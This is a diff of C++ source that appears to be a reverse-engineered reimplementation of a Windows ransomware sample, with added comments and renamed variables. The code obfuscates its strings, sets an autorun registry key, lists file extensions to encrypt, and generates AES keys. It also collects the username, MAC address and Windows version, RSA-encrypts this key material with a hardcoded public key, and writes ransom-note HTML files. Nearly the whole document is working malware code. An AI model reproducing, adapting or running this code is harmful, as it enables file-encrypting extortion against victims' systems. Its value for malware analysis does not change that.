   script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+t*$*N+Y*v*Y*C")));
   script_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;+%%t%tCKv%*v*%+v+C*N+Y+NCx*%*-+x+NCN")));
 }
-
+//========================================================================
+//   fill vector with documents extensions strings
+//========================================================================
 void FillDocExts() {
   /*
   docm,pdf,sxi,otp,odp,wks,xltx,xltm,xlsx,xlsm,xlsb,slk,xlw,xlt,xlm,xlc,dif,stc,sxc,ots,ods,hwp,uot,rtf,ppt,stw,sxw,ott,odt,sti,pps,pot,std,pptm,pptx,potm,potx,odg,otg,sxm,mml,docb,ppam,ppsm,csr,crt,key,doc,pem,dat,kwm,ppsx,txt,hdoc,docx,xls,xlsx,ppt,pptx,sqlite,1cd,cd,csv,mdb,dwg,dbf,cdr,rtf,odt,mdb,sln,max
@@ -460,7 +475,9 @@ void FillDocExts() {
     std::cout << converter.to_bytes(doc) << ",";
   std::cout << std::endl << std::endl;
 }
-
+//========================================================================
+//   function to decrypt stored strings -- to make it harder to explore .exe
+//========================================================================
 std::string InnerDecrypt(const std::string& input, size_t offset) {
   static const std::string inner_cypher_key{ ",N8VKiPrLMHTXZhyJ&jqA_m15tvbfa4nY@^F.-!RW0exD7;+l3g%OIzspS6E*(/coUkd:QwG2uC)$9B" };
   std::string tmp;
@@ -478,7 +495,9 @@ std::string InnerDecrypt(const std::string& input, size_t offset) {
     result += std::stoi(tmp.substr(i, 2), NULL, 16);
   return result;
 }
-
+//========================================================================
+//   create registry subkey with needed value and data at runtime key
+//========================================================================
 void CreateRegKey(const std::string& value, const std::string& data) {
   char buff[520];
   memset(buff, 0, 520);
@@ -496,18 +515,20 @@ void CreateRegKey(const std::string& value, const std::string& data) {
     }
   }
 }
-
-//create autorun registry key, you probably don't want to run it
+//========================================================================
+//   create autorun registry key, you probably don't want to run it
+//========================================================================
 void CreateAutostartRegKey() {
   char module_name[260];
   GetModuleFileNameA(NULL, module_name, 260);
   std::string ffbde_str = InnerDecrypt("*******Y*v*C***v*v*Y*****Y"); //fffdebfeedffd, same str
   CreateRegKey(module_name, ffbde_str);
 }
-
-//return formatted mac address from 1st adapter
-//code stolen from stackoverflow by original authors, together with segfault
-//http://stackoverflow.com/questions/13646621/how-to-get-mac-address-in-windows-with-c
+//========================================================================
+//     return formatted mac address from 1st adapter
+//     code stolen from stackoverflow by original authors, together with segfault
+//     http://stackoverflow.com/questions/13646621/how-to-get-mac-address-in-windows-with-c
+//========================================================================
 std::string GetMac() {
   std::string iphlpapi_name { InnerDecrypt("YN+x*K*$+x*t+x*NC(*Y*$*$") }; //iphlpapi.dll
   auto hnd = LoadLibraryA(iphlpapi_name.c_str());
@@ -522,13 +543,15 @@ std::string GetMac() {
   }
   //resSize = sizeof(IP_ADAPTER_INFO); some insane code, as usual
   get_adapter_proc(adapRes, &resSize);
-  //original code segfaulted when there is no net
+  //original code segfaulted when there is no network adapter
   sprintf(result, "%02X:%02X:%02X:%02X:%02X:%02X", adapRes->Address[0], adapRes->Address[1],
     adapRes->Address[2], adapRes->Address[3], adapRes->Address[4],
     adapRes->Address[5], adapRes->Address[6]);
   return result;
 }
-
+//========================================================================
+//   create hashed with SHA-256 string from input string
+//========================================================================
 std::string CreateHash(const std::string& input) {
   std::ostringstream ss;
   HCRYPTPROV hProv;
@@ -562,7 +585,9 @@ std::string CreateHash(const std::string& input) {
   }
   return ss.str();
 }
-
+//========================================================================
+//   Create initial encryption vector, which will be used as key in encryption with AES
+//========================================================================
 inline std::string CreateInitVector() {
   static const char alphabet[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
   LARGE_INTEGER qc;
@@ -579,8 +604,9 @@ inline std::string CreateInitVector() {
   }
   return random_str;
 }
-
-
+//========================================================================
+//   test file on existance
+//========================================================================
 bool TestExists(const std::wstring& fileName) {
   auto res = CreateFileW(fileName.c_str(), GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, false);
   if (res == INVALID_HANDLE_VALUE)
@@ -588,9 +614,10 @@ bool TestExists(const std::wstring& fileName) {
   CloseHandle(res);
   return true;
 }
-
-
-bool getVersionNum(int& major, int& minor) {
+//========================================================================
+//   helper function to get exact windows version  
+//========================================================================
+bool GetVersionNum(int& major, int& minor) {
   bool result = false;
   auto hnd = LoadLibrary(InnerDecrypt("Y(YvvYYtvxYN%%%CC(YYY$Y$").c_str()); //netapi32.dll
   auto func = GetProcAddress(hnd, InnerDecrypt("Y(*v+Yv+*,+%+Y*tY+*v+YYN*(***-").c_str()); //NetWkstaGetInfo
@@ -607,22 +634,26 @@ bool getVersionNum(int& major, int& minor) {
   FreeLibrary(hnd);
   return true;
 }
-
-std::string getTime() {
+//========================================================================
+//   get formatted time string
+//========================================================================
+std::string GetTime() {
   auto curTime = time(NULL);
   auto locTime = localtime(&curTime);
   char buff[80];
   strftime(buff, 80, "%Y-%m-%d.%X", locTime);
   return buff;
 }
-
-std::string getVersionString() {
+//========================================================================
+//   get exact windows version in a string
+//========================================================================
+std::string GetWinVersionString() {
   OSVERSIONINFOEXW ver;
   ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
   GetVersionExW((OSVERSIONINFOW*)&ver);
   int major, minor;
-  getVersionNum(major, minor);// original code - second call
-  if (getVersionNum(major, minor)) {
+  GetVersionNum(major, minor);// original code - second call
+  if (GetVersionNum(major, minor)) {
     ver.dwMajorVersion = major;
     ver.dwMinorVersion = minor;
   } else if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 2) {
@@ -656,7 +687,6 @@ std::string getVersionString() {
   std::string win2k{ InnerDecrypt("v+*N*(*Y*-+++%Cx%C%x%x%x") };
   std::string winUnk{ InnerDecrypt("+v*(*,*(*-++*(") };
   //here goes original insane if-switch
-  //так пишут только мудаки!!!
   if (ver.dwMajorVersion == 10 && ver.wProductType == VER_NT_WORKSTATION)
     winStr = win10;
   if (ver.dwMajorVersion == 10 && ver.wProductType != VER_NT_WORKSTATION)
@@ -691,392 +721,419 @@ std::string getVersionString() {
   if (ver.dwMajorVersion < 5)
     winStr = winUnk;
   std::string servPack{ InnerDecrypt("Cxv%*v+C+**N*%*vCxvx*t*%*,Cx") };//" Service Pack "
-
   //std::string fmt{ innerDecrypt("Cv*K*Y") };//%hd not needed
   servPack += std::to_string(ver.wServicePackMajor);
   return winStr + servPack;
 }
-
-std::string RsaEncrypt(const char* data, size_t dataLength) {
+//========================================================================
+//   encrypt data with rsa - used to encrypt aes key + system info
+//========================================================================
+std::string RsaEncrypt(const char* data, size_t data_length) {
   HCRYPTPROV prov;
   HCRYPTKEY key;
   HCRYPTHASH hash;
   auto res = CryptAcquireContext(&prov, 0, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
-  if (!res)
+  if (!res) {
     std::cout << "e0475cfaded5bc768bc26ea31f55cfac";
-  CryptImportKey(prov, kRsaPublicKey, sizeof(kRsaPublicKey), 0, 0, &key);
-  CryptCreateHash(prov, CALG_SHA, 0, 0, &hash);
-  hash = 0;
-  CryptHashData(hash, kRsaPublicKey, sizeof(kRsaPublicKey), 0);
-  CryptDeriveKey(hash, CALG_DSS_SIGN, hash, 0, &key); //does not work - pathetic
-  char* curData = new char[64];
-  //a bit more sane version than original
-  int numChunks = ceil(double(dataLength) / chunkSize);
-  std::string resultStr;
-  if (numChunks) {
-    char *cipherText = new char[numChunks * 64];
-    auto pText = cipherText;
-    DWORD cryptLen;
-    CryptEncrypt(key, 0, 1, 0, 0, &cryptLen, 0);
-    bool isFinal = false;
-    while (numChunks--) {
-      if (!numChunks)
-        isFinal = true;
-      memcpy(curData, data, 40);
-      DWORD dataLen = 40;
-      CryptEncrypt(key, 0, isFinal, 0, (BYTE*)curData, &dataLen, cryptLen);
-      data += 40;
-      memcpy(pText, curData, dataLen);
-      pText += dataLen;
-    }
-    auto totalLen = pText - cipherText;
-    char* readableText = new char[totalLen * 2 + 1];
-    auto pRT = readableText;
-    for (int i = 0; i < totalLen; i++) {
-      sprintf(pRT, "%02x", cipherText);
-      cipherText++;
-      pRT += 2;
-    }
-    *pRT = 0;
-    delete[] cipherText;
-    resultStr = readableText;
-    delete[] readableText;
   }
-  delete[] curData;
-  if (key)
+  CryptImportKey(prov, kRsaPublicKey, sizeof(kRsaPublicKey), 0, 0, &key);
+  CryptCreateHash(prov, CALG_SHA, 0, 0, &hash); //sooo, as CryptDeriveKey fails, you still have same rsa key for encryption
+  CryptHashData(hash, kRsaPublicKey, sizeof(kRsaPublicKey), 0);
+  CryptDeriveKey(hash, CALG_DSS_SIGN, hash, 0, &key); //does not work - wrong algo
+  char* cur_data = new char[64];
+  //a bit more sane version than original
+  int num_chunks = ceil(double(data_length) / kChunkSize); //get number of 64-byte chunks needed
+  std::string result_str;
+  if (num_chunks) {
+    char *cipher_text = new char[num_chunks * 64];
+    auto ct_ptr = cipher_text;
+    DWORD crypt_len;
+    CryptEncrypt(key, 0, 1, 0, 0, &crypt_len, 0);
+    bool is_final = false;
+    while (num_chunks--) {
+      if (!num_chunks) {
+        is_final = true;
+        if (data_length % 40) {
+          memcpy(cur_data, data, data_length % 40);
+        } else {
+          memcpy(cur_data, data, 40);
+        }
+      } else {
+        memcpy(cur_data, data, 40);
+      }
+      DWORD data_len = 40;
+      CryptEncrypt(key, 0, is_final, 0, (BYTE*)cur_data, &data_len, crypt_len); //encrypt current 40 bytes of data
+      data += 40;
+      memcpy(ct_ptr, cur_data, data_len); //copy to result
+      ct_ptr += data_len;
+    }
+    auto total_len = ct_ptr - cipher_text;
+    char* readable_text = new char[total_len * 2 + 1];
+    auto text_ptr = readable_text;
+    for (int i = 0; i < total_len; i++) {
+      sprintf(text_ptr, "%02x", cipher_text);
+      cipher_text++;
+      text_ptr += 2;
+    }
+    *text_ptr = 0; //ending null in c-str
+    delete[] cipher_text;
+    result_str = readable_text;
+    delete[] readable_text;
+  }
+  delete[] cur_data;
+  if (key) {
     CryptDestroyKey(key);
+  }
   CryptReleaseContext(prov, 0);
-  return resultStr;
+  return std::move(result_str);
 }
-
+//========================================================================
+//   initialization routine that generates initial aes key, 
+//   get windows data and decode base64-saved html
+//========================================================================
 bool CreateKeysGenerateHtml(const char* locale) {
   setlocale(LC_ALL, locale);
   std::cout << "7b418e360a5484eac39f03033e7a6d22" << std::endl;
   CreateMutex(NULL, false, NULL); //because why not?
   std::cout << "38d7bf4d6f755a7017b2426ebf0a212a" << std::endl;
-  auto result_hash = CreateInitVector().substr(0, 18);
-  //HERE
-  lstrcpyA((char*)rsa_hash_wchar, CreateInitVector().c_str()); //used as wchar in thread 2
-  lstrcpyA(rsa_hash, CreateInitVector().c_str());
-  std::wstring targetFile;
-  wchar_t tempBufw[260];
+  auto result_vec = CreateInitVector().substr(0, 18);
+  lstrcpyA((char*)rsa_hash_wchar, result_vec.c_str());
+  lstrcpyA(rsa_hash, result_vec.c_str());
+  std::cout << "165d1aa3ca3ae52f499d4e1330118862" << std::endl;
+  wchar_t temp_buf_w[260];
   char tempBuf[260];
-  auto res = GetTempPathW(260, tempBufw);
+  auto res = GetTempPathW(sizeof(temp_buf_w), temp_buf_w);
   if (res) {
-    temp_path = tempBufw;
+    temp_path_wstr = temp_buf_w;
   }
-  auto hnd = LoadLibraryA(shell32.c_str());
-  auto func = GetProcAddress(hnd, InnerDecrypt("v%YKY+*v+Yv%+x*v*%*N*t*$Y**-*$*Y*v+Cvx*t+Y*Kv+").c_str()); //SHGetSpecialFolderPathW
-  res = ((BOOL(WINAPI *)(HWND, LPWSTR, int, BOOL))func)(0, tempBufw, CSIDL_DESKTOPDIRECTORY, false);
-  if (res)
-    desktop_dir = tempBufw;
-  func = GetProcAddress(hnd, InnerDecrypt("v%YKY+*v+YY**-*$*Y*v+Cvx*t+Y*Kv+").c_str()); //SHGetFolderPathW -- noobs forgot to comment it out
-  FreeLibrary(hnd);
-  targetFile = temp_path;
-  std::wstring wide = converter.from_bytes(falconStr);
-  targetFile.append(wide);
-  if (TestExists(targetFile)) {
-    //some garbage output
+  auto shell_hnd = LoadLibraryA(shell32.c_str());
+  auto get_spec_proc = GetProcAddress(shell_hnd, InnerDecrypt("v%YKY+*v+Yv%+x*v*%*N*t*$Y**-*$*Y*v+Cvx*t+Y*Kv+").c_str()); //SHGetSpecialFolderPathW
+  res = ((BOOL(WINAPI *)(HWND, LPWSTR, int, BOOL))get_spec_proc)(0, temp_buf_w, CSIDL_DESKTOPDIRECTORY, false);
+  if (res) {
+    desktop_dir = temp_buf_w;
+  }
+  get_spec_proc = GetProcAddress(shell_hnd, InnerDecrypt("v%YKY+*v+YY**-*$*Y*v+Cvx*t+Y*Kv+").c_str()); //SHGetFolderPathW -- noobs forgot to comment it out
+  FreeLibrary(shell_hnd);
+  std::cout << "0f394c644e1192108a546ca55388fef1" << std::endl;
+  temp_path_copy_wstr = temp_path_wstr;
+  std::cout << "4973b8c1c7226cdb78141e149b605d99" << std::endl;
+  std::wstring  full_uri = temp_path_wstr;
+  full_uri.append(falcon9_str);
+  if (TestExists(full_uri.c_str())) {
+    std::cout << "50082d45fdb1a17d2149a15b91f59323" << std::endl;
     return 0; //so, if you have falcon9.falcon in your temp, virus does not work
   }
-  targetFile = temp_path;
-  enigma_dot_rsa = aEnigma + aRsa;
-  wide = converter.from_bytes(enigma_dot_rsa);
-  targetFile.append(wide);
-  auto fhndt = CreateFileW(targetFile.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-  if (fhndt != INVALID_HANDLE_VALUE) {
-    auto len = i_hate_c.length();
+  std::wstring enigma_uri = temp_path_wstr;
+  enigma_uri += enigma_dot_rsa;
+  auto fhnd = CreateFileW(enigma_uri.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+  if (fhnd != INVALID_HANDLE_VALUE) {
     DWORD lenHigh;
-    auto lenLow = GetFileSize(fhndt, &lenHigh);
-    lenLow -= len;
-    SetFilePointer(fhndt, lenLow, NULL, FILE_BEGIN);
+    auto lenLow = GetFileSize(fhnd, &lenHigh);
+    lenLow -= i_hate_c.length();
+    SetFilePointer(fhnd, lenLow, NULL, FILE_BEGIN);
     char buff[7];
     lenHigh = 0;
-    ReadFile(fhndt, buff, 7, &lenHigh, 0);
-    if (std::string(buff) == i_hate_c)
-      //some more garbage
+    ReadFile(fhnd, buff, 7, &lenHigh, 0);
+    if (std::string(buff, 7).compare(i_hate_c) != 0) {
+      std::cout << "e0c8ff5935a12b566ef4d02af4a1a718" << std::endl;
       return false;  //did not close handle
-    CloseHandle(fhndt);
+    }
+    CloseHandle(fhnd);
   }
-  std::wstring doubleSlash = converter.from_bytes(InnerDecrypt("v$v$"));
-  std::wstring tempFileNameW = temp_path + converter.from_bytes(enigma_dot_rsa);
-  std::string  tempFileName = converter.to_bytes(tempFileNameW);
-  htmlBody = std::regex_replace(htmlBody, std::regex(secondMark), tempFileName);
-  tempFileNameW = desktop_dir + doubleSlash + converter.from_bytes(enigma_dot_rsa);
-  tempFileName = converter.to_bytes(tempFileNameW);
-  htmlBody = std::regex_replace(htmlBody, std::regex(firstMark), tempFileName);
-  std::string htmlBr{ "<br>" };
-  htmlBody = std::regex_replace(htmlBody, std::regex("\n"), htmlBr);
-  htmlHead = std::regex_replace(htmlHead, std::regex(htaMark), htmlBody); //html ready
-  std::wstring htmlFile = temp_path + converter.from_bytes(html_file_name);
-  DeleteFileW(htmlFile.c_str());
-  auto fhnd = CreateFileW(htmlFile.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-  if (fhnd == INVALID_HANDLE_VALUE)
+  std::wstring double_slash = converter.from_bytes(InnerDecrypt("v$v$")); //not used
+  std::wstring temp_enigma_uri = temp_path_wstr + enigma_dot_rsa;
+  std::wstring desktop_enigma_uri = desktop_dir + converter.from_bytes("\\") + enigma_dot_rsa;
+  html_body = std::regex_replace(html_body, std::regex(temp_mark), converter.to_bytes(temp_enigma_uri)); //replaced two anchors with actual paths
+  html_body = std::regex_replace(html_body, std::regex(desktop_mark), converter.to_bytes(desktop_enigma_uri));
+  html_body = std::regex_replace(html_body, std::regex("\n"), "<br>");
+  html_head = std::regex_replace(html_head, std::regex(hta_mark), html_body); //html ready
+  std::wstring html_file = temp_path_wstr + html_file_name;
+  DeleteFileW(html_file.c_str());
+  auto html_hnd = CreateFileW(html_file.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+  if (html_hnd == INVALID_HANDLE_VALUE) {
+    std::cout << "e5ec74fb8acfacb387699ce1aaebceba" << std::endl;
     return false;
+  }
   DWORD bytesWritten;
-  WriteFile(fhnd, htmlHead.c_str(), htmlHead.length(), &bytesWritten, 0);
+  WriteFile(fhnd, html_head.c_str(), html_head.length(), &bytesWritten, 0);
   CloseHandle(fhnd);
-  htmlJS = std::regex_replace(htmlJS, std::regex("\n"), htmlBr);
-  htmlJS = std::regex_replace(htmlJS, std::regex(htaMark), htmlBody); //second html with javascript
-  htmlFile = temp_path + converter.from_bytes(js_file_name);
-  DeleteFileW(htmlFile.c_str());
-  fhnd = CreateFileW(htmlFile.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-  if (fhnd == INVALID_HANDLE_VALUE)
+  html_js = std::regex_replace(html_js, std::regex("\n"), "<br>");
+  html_js = std::regex_replace(html_js, std::regex(hta_mark), html_body); //second html with javascript
+  std::wstring js_html_file = temp_path_wstr + converter.from_bytes(js_file_name);
+  DeleteFileW(js_html_file.c_str());
+  fhnd = CreateFileW(js_html_file.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+  if (fhnd == INVALID_HANDLE_VALUE) {
     return false;
-  WriteFile(fhnd, htmlHead.c_str(), htmlHead.length(), &bytesWritten, 0);
+  }
+  WriteFile(fhnd, html_head.c_str(), html_head.length(), &bytesWritten, 0);
   CloseHandle(fhnd);
-  //somethin interestin
-  for (auto i : doc_exts_vector)
-    if (i.size())
-      all_extensions.push_back(i);
-  for (auto i : script_exts_vector)
-    if (i.size())
-      all_extensions.push_back(i);
-  for (auto i : media_exts_vector)
-    if (i.size())
-      all_extensions.push_back(i);
-  for (auto i : archive_exts_vector)
-    if (i.size())
-      all_extensions.push_back(i);
-  //vectorPtrs.resize(all_extensions.size()); // sane version
-  /*for (int i = 0; i < all_extensions.size(); i++) //original code
-    vectorStringPtrs.push_back(NULL);*/
-  vector_filetype_count.reserve(all_extensions.size());
-  std::wstring rsaFile = temp_path + converter.from_bytes(enigma_dot_rsa);
-  char uNameBuff[0x101];
-  DWORD buffSize = 0x101;
-  GetUserNameA(uNameBuff, &buffSize);
-  std::string uname{ uNameBuff };
-  fhnd = CreateFileW(rsaFile.data(), GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-  char fileBuffer[1000];
-  if (fhnd == INVALID_HANDLE_VALUE)
+  //fill vector with extensions to encrypt
+  for (auto ext : doc_exts_vector)
+    if (ext.length())
+      exts_to_encrypt.push_back(ext);
+  for (auto ext : script_exts_vector)
+    if (ext.length())
+      exts_to_encrypt.push_back(ext);
+  for (auto ext : media_exts_vector)
+    if (ext.length())
+      exts_to_encrypt.push_back(ext);
+  for (auto ext : archive_exts_vector)
+    if (ext.length())
+      exts_to_encrypt.push_back(ext);
+  for (int i = 0; i < exts_to_encrypt.size(); i++) {  //initialize to 0, original code
+    encoded_exts_stats.push_back(0);
+  }
+  encoded_exts_stats.reserve(exts_to_encrypt.size());
+  std::wstring rsa_file = temp_path_wstr + enigma_dot_rsa;
+  char uname_buff[257];
+  DWORD buff_size = 257;
+  GetUserNameA(uname_buff, &buff_size);
+  std::string uname{ uname_buff };
+  fhnd = CreateFileW(rsa_file.data(), GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+  char file_buffer[1000];
+  if (fhnd == INVALID_HANDLE_VALUE) {
     return false;
-  auto len = i_hate_c.length();
+  }
   DWORD lenHigh;
   auto lenLow = GetFileSize(fhnd, &lenHigh);
   DWORD bytesRead;
-  bool readMore = true;
-  while (readMore) {
-    ReadFile(fhnd, fileBuffer, 1000, &bytesRead, 0);
-    //if (bytesRead >= 1000) //original code
-    if (!bytesRead) //sane code
-      readMore = false;
-    std::string dataRead{ fileBuffer }; //as if file is with text only
-    size_t lastPos = 0, curPos = 0;
-    //count endlines
-    while (true) {
-      curPos = dataRead.find("\n", lastPos, 1);
-      if (curPos == std::string::npos)
-        break;
-      enigma_dot_rsa_newlines++;
-      lastPos += curPos;
+  bool read_more = true;
+  while (read_more) {
+    ReadFile(fhnd, file_buffer, 1000, &bytesRead, 0);
+    if (bytesRead >= 1000) {
+      read_more = false;
+    }
+    std::string data_read{ file_buffer }; //as if file is with text only
+    size_t last_pos = 0, cur_pos = 0;
+    //count lines
+    while ((cur_pos = data_read.find("\n", last_pos, 1)) != std::string::npos) {
+      enigma_dot_rsa_num_lines++;
+      last_pos += cur_pos;
     }
   }
   CloseHandle(fhnd);
-  if (enigma_dot_rsa_newlines)
-    enigma_dot_rsa_newlines++;
-  auto doubleSemicol = InnerDecrypt("%m%m");//::
-  std::string dataToEncrypt{ "" };
-  dataToEncrypt += InnerDecrypt("+x*t+%+%%m%m");//pass::
-  dataToEncrypt += rsa_hash;
-  dataToEncrypt += doubleSemicol;
-  dataToEncrypt += InnerDecrypt("+%+Y*t+C+Y%(%(");//start>>
-  dataToEncrypt += std::to_string(enigma_dot_rsa_newlines); //uint64_to_str
-  dataToEncrypt += doubleSemicol;
-  dataToEncrypt += uname;
-  dataToEncrypt += doubleSemicol;
-  dataToEncrypt += GetMac();
-  dataToEncrypt += doubleSemicol;
-  dataToEncrypt += getVersionString();//"Windows ver Service Pack num"
-  dataToEncrypt += doubleSemicol;
-  dataToEncrypt += getTime(); //time as "%Y-%m-%d.%X" format
-  dataToEncrypt += doubleSemicol;
-  dataToEncrypt += locale; //"null" as default
-  dataToEncrypt += doubleSemicol;
-  dataToEncrypt += mark_737; //"737"
-  dataToEncrypt += doubleSemicol;
-  dataToEncrypt += std::to_string(18); //"18"
-  dataToEncrypt += doubleSemicol;
-  dataToEncrypt += std::to_string(int(shadowCopyOff));
-  dataToEncrypt += "\n";
-  derived_key = doubleSemicol;
-  derived_key.append(rsa_hash);
-  derived_key += doubleSemicol;
-  derived_key += uname;
-  derived_key += doubleSemicol;
-  derived_key += formatted_mac_string;
-  derived_key += doubleSemicol;
-  auto csum = RsaEncrypt(derived_key.data(), derived_key.length());
+  if (enigma_dot_rsa_num_lines) {
+    enigma_dot_rsa_num_lines--;
+  }
+  auto dbl_semicolon = InnerDecrypt("%m%m");//::
+  //fill collected data
+  std::string data_to_encrypt{ "" };
+  data_to_encrypt += InnerDecrypt("+x*t+%+%%m%m");//pass::
+  data_to_encrypt += rsa_hash;
+  data_to_encrypt += dbl_semicolon;
+  data_to_encrypt += InnerDecrypt("+%+Y*t+C+Y%(%(");//start>>
+  data_to_encrypt += std::to_string(enigma_dot_rsa_num_lines); //uint64_to_str
+  data_to_encrypt += dbl_semicolon;
+  data_to_encrypt += uname;
+  data_to_encrypt += dbl_semicolon;
+  data_to_encrypt += GetMac();
+  data_to_encrypt += dbl_semicolon;
+  data_to_encrypt += GetWinVersionString();//"Windows ver Service Pack num"
+  data_to_encrypt += dbl_semicolon;
+  data_to_encrypt += GetTime(); //time as "%Y-%m-%d.%X" format
+  data_to_encrypt += dbl_semicolon;
+  data_to_encrypt += locale; //"null" as default
+  data_to_encrypt += dbl_semicolon;
+  data_to_encrypt += mark_737; //"737"
+  data_to_encrypt += dbl_semicolon;
+  data_to_encrypt += std::to_string(18); //"18"
+  data_to_encrypt += dbl_semicolon;
+  data_to_encrypt += std::to_string(int(is_shadow_copy_off));
+  data_to_encrypt += "\n";
+  encrypted_key = dbl_semicolon;
+  encrypted_key.append(rsa_hash);
+  encrypted_key += dbl_semicolon;
+  encrypted_key += uname;
+  encrypted_key += dbl_semicolon;
+  encrypted_key += formatted_mac_string;
+  encrypted_key += dbl_semicolon;
+  auto csum = RsaEncrypt(encrypted_key.data(), encrypted_key.length());  //encrypt aes key and mac with public rsa key hardcoded in .exe
+  csum = dbl_semicolon + csum;
   csum += "\n";
-  csum = doubleSemicol + csum;
-  derived_key = csum;
-  derived_key += doubleSemicol;
-  derived_key += mark_737;
-  dataToEncrypt += doubleSemicol;
-  dataToEncrypt += derived_key;
-  dataToEncrypt += "\n";
-  fhnd = CreateFileW(rsaFile.data(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // reopen for writing
-  SetFilePointer(fhnd, GetFileSize(fhnd, &lenHigh), NULL, FILE_BEGIN); //lenHigh never used
-  auto dataToWrite = RsaEncrypt(dataToEncrypt.data(), dataToEncrypt.length());
-  dataToWrite += doubleSemicol;
-  dataToWrite += mark_737;
-  WriteFile(fhnd, dataToWrite.data(), dataToWrite.length(), &bytesWritten, NULL);
+  encrypted_key = std::move(csum); //now holds encrypted value for the aes
+  encrypted_key += dbl_semicolon;
+  encrypted_key += mark_737;
+  data_to_encrypt += dbl_semicolon;
+  data_to_encrypt += encrypted_key;
+  data_to_encrypt += "\n";
+  fhnd = CreateFileW(rsa_file.data(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // reopen for writing
+  if (fhnd == INVALID_HANDLE_VALUE) {
+    return false;
+  }
+  SetFilePointer(fhnd, GetFileSize(fhnd, &lenHigh), NULL, FILE_BEGIN); //lenHigh never used, append to the end of enigma.rsa
+  auto encrypted_data = RsaEncrypt(data_to_encrypt.data(), data_to_encrypt.length()); //encrypt whole stats
+  encrypted_data += dbl_semicolon;
+  encrypted_data += mark_737;
+  WriteFile(fhnd, encrypted_data.data(), encrypted_data.length(), &bytesWritten, NULL);
   CloseHandle(fhnd);
   return true;
 }
-
-std::vector<std::string> splitStringToVec(const std::string& input, const char* delim) {
-  auto copyCstr = strdup(input.c_str());
-  auto left = strtok(copyCstr, delim);
+//========================================================================
+//   split string into vector, stolen from
+//   http://stackoverflow.com/questions/236129/split-a-string-in-c
+//========================================================================
+std::vector<std::string> SplitString(const std::string& input, const char* delim) {
+  auto copy_str = strdup(input.c_str());
+  auto left = strtok(copy_str, delim);
   std::vector<std::string> result;
   while (left) {
     result.push_back(left);
     left = strtok(NULL, delim);
   }
-  free(copyCstr);
+  free(copy_str);
   return result;
 }
-
+//========================================================================
+//   write current progress stats(files encrypted by their extensions)
+//========================================================================
 DWORD WINAPI CheckEncFilesStats(LPVOID lpParameter) {
-  temp_file = temp_path + converter.from_bytes(enigma_dot_rsa);
+  temp_file = temp_path_wstr + enigma_dot_rsa;
   LARGE_INTEGER qc;
   QueryPerformanceCounter(&qc);
   srand(qc.LowPart);
   std::string dataToDo;
-  char random[16];
-  for (int i = 0; i < 16; i++) //initial vector
-    random[i] = secondAlphabet[rand() % 78];
-  random[16] = 0;
-  std::string hashStr{ random };
-  std::string doubleSemicol{ InnerDecrypt("%m%m") }; //::
-  while (!no_more_files) { //set in enigmaThread2
+  char marker_bytes[15];
+  for (int i = 0; i < 15; i++) { //initial vector
+    marker_bytes[i] = second_alphabet[rand() % 78];
+  }
+  std::string marker_str{ marker_bytes }; //used to mark place with encrypted file
+  std::string double_semicol{ InnerDecrypt("%m%m") }; //::
+  while (!no_more_files) { //set in FileCodingThread without sync
     std::cout << "dfe0bce5501ea80a3731c8eae98853f5" << std::endl;
-    auto vecSize = vector_filetype_count.size();
+    auto vector_size = encoded_exts_stats.size();
     std::cout << "16ac0b067c4a1aba7931a53efb1e28ea" << std::endl;
-    std::string workStatTick{ InnerDecrypt("v+Y-vCY,v%vYYtvYvYYNY%Y,v$*(") }; //WORKSTATTICK\n
-    workStatTick += formatted_mac_string;
-    workStatTick += "\n";
+    std::string work_stat_tick{ InnerDecrypt("v+Y-vCY,v%vYYtvYvYYNY%Y,v$*(") }; //WORKSTATTICK\n
+    work_stat_tick += formatted_mac_string;
+    work_stat_tick += "\n";
     std::cout << "9d313694f1375a98bf5edc6b7302e340" << std::endl;
     int i = 0;
-    for (auto item : vector_filetype_count) {//inner loop 1
-      auto numFiles = std::to_string(item);//number of matched files
-      auto resultStr = converter.to_bytes(all_extensions[i++]);
-      workStatTick += resultStr;
-      workStatTick += "->";
-      workStatTick += numFiles;
-      workStatTick += "\n";
+    for (auto item : encoded_exts_stats) {
+      auto num_matched = std::to_string(item);//number of matched files
+      auto result_str = converter.to_bytes(exts_to_encrypt[i++]);
+      work_stat_tick += result_str;
+      work_stat_tick += "->";
+      work_stat_tick += num_matched;
+      work_stat_tick += "\n";
     }
+    std::cout << "8528b9ececf359700238590a0eb8d9a1" << std::endl;
     std::string backups = InnerDecrypt("YC*t*%*,vv+xv%+%v$*("); //BackUpSs//n
-    if (shadowCopyOff) {
-      backups = workStatTick + backups;
